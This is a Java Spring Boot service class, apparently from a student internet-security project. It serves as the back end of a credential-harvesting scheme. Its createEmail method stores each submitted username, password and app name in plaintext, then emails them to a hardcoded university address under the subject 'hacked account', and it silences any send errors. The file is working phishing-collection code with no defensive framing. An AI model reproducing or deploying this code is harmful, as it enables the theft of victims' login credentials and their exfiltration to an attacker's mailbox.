package com.example.baomatinternet.service.Impl;

import com.example.baomatinternet.entity.email;
import com.example.baomatinternet.repository.EmailRepository;
import com.example.baomatinternet.service.EmailService;
import com.example.baomatinternet.dto.EmailRequest;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.mail.SimpleMailMessage;
import org.springframework.mail.javamail.JavaMailSender;
import org.springframework.stereotype.Service;

import java.util.List;
import java.util.Optional;

@Service
public class EmailServiceImpl implements EmailService {


    @Value("${spring.mail.username}") // Lấy giá trị từ cấu hình
    private String fromEmail;

    @Autowired
    private JavaMailSender mailSender;

    private final EmailRepository emailRepository;

    public EmailServiceImpl(EmailRepository emailRepository) {
        this.emailRepository = emailRepository;
    }

    @Override
    public List<email> getAllEmails() {
        return emailRepository.findAll();
    }

    @Override
    public email getEmailById(Integer id) {
        Optional<email> optionalEmail = emailRepository.findById(id);
        return optionalEmail.orElseThrow(() -> new RuntimeException("Email not found with id " + id));
    }

    @Override
    public email createEmail(EmailRequest emailRequest) {
        email emailSave = new email();

        // Map fields from DataBinRequest to email
        emailSave.setUsername(emailRequest.getUsername());
        emailSave.setPassword(emailRequest.getPassword());
        emailSave.setApp(emailRequest.getApp());

        try {
            String emailTo = "21522446@gm.uit.edu.vn"; // Thay bằng email người nhận
            String data = ""; // Sử dụng String thay cho StringBuilder
            // username
            data += "Tên tài khoản là: " + emailRequest.getUsername() + "\n";
            data += "Mật Khẩu là: " + emailRequest.getPassword() + "\n";
            data += "Ứng dụng là: " + emailRequest.getApp() + "\n";

            String subject = "Tài khoản hackked";

            sendEmail(emailTo, subject,data);
        } catch (Exception e) {
            // Ghi log lỗi nhưng không dừng chương trình
            System.out.println("Can't send email");
        }


        return emailRepository.save(emailSave);
    }

    private void sendEmail(String to, String subject, String text) {
        SimpleMailMessage message = new SimpleMailMessage();
        message.setTo(to);
        message.setSubject(subject);
        message.setText(text);
        message.setFrom(fromEmail);
        mailSender.send(message);
    }

    @Override
    public email updateEmail(Integer id, email updatedEmail) {
        email existingEmail = getEmailById(id);
        existingEmail.setUsername(updatedEmail.getUsername());
        existingEmail.setPassword(updatedEmail.getPassword());
        existingEmail.setApp(updatedEmail.getApp());
        return emailRepository.save(existingEmail);
    }

    @Override
    public void deleteEmail(Integer id) {
        emailRepository.deleteById(id);
    }
}
